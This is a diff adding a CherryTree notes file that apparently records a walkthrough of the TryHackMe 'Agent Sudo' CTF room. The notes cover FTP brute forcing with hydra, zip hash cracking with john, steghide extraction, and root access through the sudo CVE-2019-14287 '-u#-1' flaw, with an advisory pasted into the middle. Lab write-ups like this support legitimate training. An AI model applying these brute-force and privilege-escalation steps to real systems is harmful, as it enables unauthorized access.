@@ -1,0 +1,170 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="AgentSudo(THM)" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1614001360" ts_lastsave="1614001367">
+    <node name="Notes" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1614001367" ts_lastsave="1614001377">
+      <rich_text>1-We visit the web page but we need to specify a custom user agent to view hidden directory to get username available on machine
+2- Using burpsuite we changed user agent from mozilla to “user-agent” as required by the task.
+3- after finfing the name “Chris” we bruteforce it with hydra on ftp service
+4- password for chris ftp is “crystal”
+5- we have 2 pictures and 1 text file .we get those on our machine
+6- the text file tells us that some data is hidden in one of those pics and 
+7- we use binwalk and we see some sort of  zip file in cutie.png
+8- we extract it with binwalk -e cutie.png
+9- its password protected file so we  use zip2john to crack it.we get a hash 
+8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
+10- we use john the ripper  to crack the hash
+john  --wordlist=/usr/share/wordlists/rockyou.txt Output.txt  
+11- password is “alien”
+12- now we use 7z e 8702.zip to proccess the zip file,it says info hasbeen sent to file named “T0_agent_R.txt”
+13-its content are 
+cat To_agentR.txt   
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+14-decoding it gives us value of Area51.
+15 -Now we use  steghide on cute-alien.jpg and give the above “Area51” Password
+steghide extract -sf cute-alien.jpg 
+Enter passphrase: 
+wrote extracted data to "message.txt".
+
+16 - we get username and password for ssh
+cat message.txt  
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+17- LOging in ssh
+18- user flag is “b03d975e8c92a7c04146cfa7a5a313c7”
+19- AFter many enumaration i couldnt find any PE Vector although suo -l shows us that we can run /bin/bash as root but it wasnt happening.I didnt check exploits for sudo version but after viewing it in walkthrough i found that we have to exploit sudo itself to get root
+20- sudo version 1.8.21 was vulnerable to an overflow in which we provide user id of -1 allowing us root access duw to integer overflow flaw.
+
+
+
+     </rich_text>
+      <rich_text weight="heavy">Published:</rich_text>
+      <rich_text> 2019-10-15   
+
+  
+
+
+                                            </rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+                    
+                    
+                    
+                
+                
+                
+</rich_text>
+      <rich_text scale="h3">Security Advisory</rich_text>
+      <rich_text>
+                                This security advisory describes one low risk vulnerability.
+                                
+             
+</rich_text>
+      <rich_text scale="h3">1) </rich_text>
+      <rich_text link="webs https://www.cybersecurity-help.cz/vulnerabilities/21782/" scale="h3">Permissions, Privileges, and Access Controls</rich_text>
+      <rich_text>
+    </rich_text>
+      <rich_text weight="heavy">Risk:</rich_text>
+      <rich_text> Low
+    </rich_text>
+      <rich_text weight="heavy">CVSSv3:</rich_text>
+      <rich_text>           </rich_text>
+      <rich_text link="webs https://www.cybersecurity-help.cz/vdb/cvss3/#CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C">6.3 [CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C]</rich_text>
+      <rich_text> </rich_text>
+      <rich_text foreground="#ff0000">[PCI]</rich_text>
+      <rich_text>    
+    </rich_text>
+      <rich_text weight="heavy">CVE-ID:</rich_text>
+      <rich_text>             CVE-2019-14287         
+    </rich_text>
+      <rich_text weight="heavy">CWE-ID:</rich_text>
+      <rich_text>                                       </rich_text>
+      <rich_text link="webs https://www.cybersecurity-help.cz/vdb/cwe/264/">CWE-264 - Permissions, Privileges, and Access Controls</rich_text>
+      <rich_text>
+      
+    </rich_text>
+      <rich_text weight="heavy">Exploit availability:</rich_text>
+      <rich_text>                                       </rich_text>
+      <rich_text link="webs https://www.cybersecurity-help.cz/exploits/21782/?ref=bulletin">Yes</rich_text>
+      <rich_text>     
+             </rich_text>
+      <rich_text weight="heavy">Description</rich_text>
+      <rich_text>     
+The vulnerability allows a local user to escalate privileges on the system.
+The  vulnerability exists in the implementation of the "sudo" application  when processing commands that are configured to run with ALL  keyword. A local user with privileges to use sudo for specific  applications on the system can escalate privileges and run the  application as root (even if precisely restricted), if user id "-1" or  "4294967295" is used.
+Example:
+The following entry instructs sudo to allow user bob to run "/usr/bin/id" command as any user on the system but root:
+myhost bob = (ALL, !root) /usr/bin/idThe following command will allow bob execute the  "/usr/bin/id" command as root:
+sudo -u#-1 id -u
+22- Root flag is
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+23-</rich_text>
+      <table char_offset="2344" justification="left" col_min="400" col_max="400">
+        <row>
+          <cell>Patch available</cell>
+          <cell>YES</cell>
+        </row>
+        <row>
+          <cell>Number of vulnerabilities</cell>
+          <cell>1</cell>
+        </row>
+        <row>
+          <cell>CVE ID</cell>
+          <cell>CVE-2019-14287</cell>
+        </row>
+        <row>
+          <cell>CWE ID</cell>
+          <cell>CWE-264</cell>
+        </row>
+        <row>
+          <cell>Exploitation vector</cell>
+          <cell>Local</cell>
+        </row>
+        <row>
+          <cell>Public exploit</cell>
+          <cell>Public exploit code for vulnerability #1 is available.</cell>
+        </row>
+        <row>
+          <cell>Vulnerable software</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell>Risk</cell>
+          <cell>Low</cell>
+        </row>
+      </table>
+      <table char_offset="2347" justification="left" col_min="400" col_max="400">
+        <row>
+          <cell>Vendor</cell>
+          <cell>Sudo</cell>
+        </row>
+        <row>
+          <cell>Sudo                               
+                                                              Client/Desktop applications /                               Software for system administration</cell>
+          <cell></cell>
+        </row>
+      </table>
+    </node>
+  </node>
+</cherrytree>
